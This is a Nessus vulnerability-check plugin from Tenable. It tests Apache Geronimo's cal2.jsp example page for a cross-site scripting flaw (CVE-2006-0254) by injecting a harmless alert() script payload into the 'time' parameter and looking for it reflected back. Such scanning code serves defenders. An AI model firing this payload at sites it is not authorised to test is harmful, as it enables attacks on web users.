#
# (C) Tenable Network Security
#


if (description) {
  script_id(20738);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-0254");
  script_bugtraq_id(16260);

  script_name(english:"Geronimo cal2.jsp Example Cross-Site Scripting Vulnerability");
  script_summary(english:"Checks for cal2.jsp cross-site scripting vulnerability in Geronimo");
 
  desc = "
Synopsis :

The remote web server contains a JSP application that is prone to a
cross-site scripting flaw. 

Description :

The remote host appears to be running Geronimo, an open-source J2EE
server from the Apache Software Foundation. 

The version of Geronimo installed on the remote host includes a JSP
application that fails to sanitize user-supplied input to the 'time'
parameter before using it to generate a dynamic webpage.  An attacker
can exploit this flaw to cause arbitrary HTML and script code to be
executed in a user's browser within the context of the affected web
site. 

See also :

http://www.oliverkarow.de/research/geronimo_css.txt
http://issues.apache.org/jira/browse/GERONIMO-1474

Solution :

Uninstall the example applications or upgrade to Geronimo version
1.0.1 or later. 

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:P/A:N/B:N)";
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:8080);
if (!get_port_state(port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# Unless we're paranoid, make sure the banner looks like Geronimo w/ Jetty.
if (report_paranoia < 2) {
  banner = get_http_banner(port:port);
  if (!banner || "Server: Jetty" >!< banner) exit(0);
}


# A simple alert.
xss = '<script>alert("' + SCRIPT_NAME + '")</script>';


# Try to exploit the flaw in cal2.jsp.
req = http_get(
  item:string(
    "/jsp-examples/cal/cal2.jsp?",
    'time="/>', urlencode(str:xss)
  ), 
  port:port
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# There's a problem if we see our XSS.
if (string('INPUT NAME="time" TYPE=HIDDEN VALUE="/>', xss) >< res) {
  security_note(port);
  exit(0);
}
